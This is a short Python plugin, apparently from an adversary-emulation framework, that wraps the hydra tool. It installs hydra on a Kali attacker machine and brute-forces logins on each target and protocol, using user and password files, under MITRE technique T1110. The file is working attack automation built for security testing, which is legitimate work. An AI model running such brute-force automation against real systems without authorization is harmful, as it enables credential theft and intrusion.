#!/usr/bin/env python3

# A plugin for hydra bruteforce attacks

from plugins.base.kali import KaliPlugin


class HydraPlugin(KaliPlugin):

    # Boilerplate
    name = "hydra"
    description = "A plugin controlling the hydra brute forcing tool"
    ttp = "T1110"
    references = ["https://attack.mitre.org/techniques/T1110/"]

    required_files_attacker = ["passwords.txt", "users.txt"]    # Files shipped with the plugin which are needed by the kali tool. Will be copied to the kali share

    def __init__(self):
        super().__init__()
        self.plugin_path = __file__

    def run(self, targets):
        """ Run the command

        @param targets: A list of targets, ip addresses will do
        """

        # Set defaults if not present in config
        playground = self.attacker_machine_plugin.get_playground()

        # Generate command
        cmd = f"cd {playground};"
        cmd += "sudo apt -y install hydra;"
        for t in targets:
            for p in self.conf['protocols']:
                cmd += f"hydra -L {self.conf['userfile']}  -P {self.conf['pwdfile']} {p}://{t};"

        res = self.attacker_run_cmd(cmd) or ""

        return res
